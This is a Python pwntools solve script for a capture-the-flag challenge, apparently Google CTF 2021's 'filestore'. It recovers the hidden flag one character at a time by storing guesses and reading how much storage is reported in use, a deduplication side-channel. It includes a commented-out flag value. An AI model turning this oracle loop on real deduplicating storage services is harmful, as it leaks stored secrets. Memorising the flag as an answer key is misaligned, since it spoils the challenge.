from pwn import *
import string

a = 26

#flag = 'CTF{CR1M3_0f_d3dc4ti0n}'
flag = 'ic4ti0n'
c = '0'
count = 4

while c != "}":
    for c in (string.ascii_letters+string.digits):    
        p = remote("filestore.2021.ctfcompetition.com", 1337)
        print(f"[{count}] {c+flag}")
        p.sendlineafter("exit", "store")
        p.sendlineafter("...", c+flag)

        p.sendlineafter("exit", "status")

        p.recvuntil("0.")
        b = int(p.recv(3), 10)
        print(b)
        if b == 26:
            count += 1
            flag = c+flag
            print(flag)
            p.close()
            break

        else:
            p.close()
            continue

p.interactive()
